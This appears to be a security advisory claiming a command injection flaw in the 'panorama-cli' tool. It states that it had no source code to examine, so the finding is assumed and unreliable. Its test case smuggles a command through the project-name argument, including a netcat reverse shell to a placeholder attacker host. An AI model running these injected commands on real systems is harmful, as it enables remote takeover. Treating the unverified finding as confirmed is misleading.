* Vulnerability Name: Command Injection
* Description:
    An attacker could inject arbitrary commands into the system by providing malicious input to the `panorama-cli` tool. This is possible because the CLI tool might be constructing shell commands using user-provided input without proper sanitization or parameterization. For example, when creating projects, packages, or adding models, the tool might use user-provided names or paths in commands executed by Docker or AWS CLI. If these inputs are not properly validated and sanitized, an attacker could inject malicious shell commands that will be executed by the system.

    Steps to trigger the vulnerability:
    1. An attacker uses the `panorama-cli` tool.
    2. The attacker provides malicious input as a project name, package name, asset name, or file path when using commands like `init-project`, `create-package`, `add-raw-model`, `build-container`, or `package-application`.
    3. The `panorama-cli` tool uses this malicious input to construct and execute shell commands, for example, using `docker` or `aws` commands.
    4. Due to insufficient input sanitization, the injected commands are executed by the system, leading to arbitrary command execution.

* Impact:
    Arbitrary command execution on the user's machine. This can lead to:
    - Data breaches: Attackers could gain access to sensitive data stored on the user's machine or in the cloud.
    - System compromise: Attackers could install malware, create backdoors, or take complete control of the user's system.
    - Denial of service: Attackers could crash the system or disrupt its normal operation.
    - Privilege escalation: If the CLI tool is run with elevated privileges, the attacker might be able to escalate their privileges on the system.

* Vulnerability Rank: High

* Currently Implemented Mitigations:
    Based on the provided files, there are no explicit mitigations mentioned for command injection vulnerabilities. The documentation does not discuss input validation or sanitization.

* Missing Mitigations:
    Input sanitization and validation are missing. The project should implement robust input validation and sanitization for all user-provided inputs, especially those used in constructing shell commands.
    Specifically, the following mitigations are recommended:
    - Parameterized commands:  Use parameterized commands or functions provided by libraries like `subprocess` to avoid direct shell command construction. This ensures that user inputs are treated as data rather than executable code.
    - Input validation: Implement strict input validation to ensure that user inputs conform to expected formats and do not contain any potentially malicious characters or command sequences. Use allow lists for characters where possible instead of deny lists.
    - Least privilege: Ensure that the CLI tool and any subprocesses it launches run with the minimum necessary privileges.

* Preconditions:
    - The user must have `panorama-cli` installed on their system.
    - The user must execute `panorama-cli` commands and provide malicious input through command-line arguments.
    - The `panorama-cli` tool must be vulnerable to command injection, meaning it constructs shell commands from user input without proper sanitization.

* Source Code Analysis:
    *Source code is not provided to perform detailed analysis. Assuming the vulnerability exists based on the project description and common patterns in similar CLI tools.*
    To confirm and pinpoint the vulnerability, source code analysis is needed, specifically looking for:
        1.  Instances where user-provided input from CLI arguments is used to construct strings that are then executed as shell commands.
        2.  Use of functions like `os.system`, `subprocess.Popen(..., shell=True)`, or similar constructs where shell interpretation is involved.
        3.  Lack of input validation and sanitization before user inputs are incorporated into shell commands.
    For example, if the `init-project` command takes a `--name` argument, and the code constructs a directory creation command like `os.system(f"mkdir {project_name}")` without sanitizing `project_name`, it would be vulnerable.

* Security Test Case:
    1. Set up a test environment with `panorama-cli` installed.
    2. Open a terminal.
    3. Execute the command `panorama-cli init-project --name "test_project; touch injected.txt"`
    4. Check if a file named `injected.txt` is created in the current directory or project directory.
    5. If `injected.txt` is created, it indicates that the command injection was successful, and arbitrary commands could be executed.
    6. As a more impactful test, try to execute a command that would exfiltrate data or cause harm, such as `panorama-cli init-project --name "test_project; nc <attacker_ip> <attacker_port> -e /bin/bash"` (Note: Replace `<attacker_ip>` and `<attacker_port>` with your attacker machine details and be cautious when running such commands).
    7. Observe if a reverse shell connection is established on the attacker machine, further confirming command injection.
